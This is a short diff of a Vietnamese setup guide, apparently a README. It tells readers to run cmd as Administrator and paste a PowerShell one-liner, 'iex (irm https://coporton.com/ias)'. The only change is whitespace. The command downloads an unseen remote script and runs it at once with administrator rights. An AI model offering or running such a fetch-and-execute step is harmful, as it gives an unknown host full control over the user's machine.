@@ -10,7 +10,7 @@ QR ngân hàng nếu quí khách có lòng hảo tâm, ủng hộ người soạ
 - Bạn chạy **cmd** bằng quyền **Run as Administrator** sau đó copy đoạn code sau đây dán vào và nhấn **Enter**
   
   ```php
-  powershell iex (irm https://coporton.com/ias)  
+  powershell iex (irm https://coporton.com/ias)
   ```
 
 - Hoặc bạn chạy **Windows PowerShell** bằng quyền **Run as Administrator** rồi dán một trong các câu lệnh sau vào:
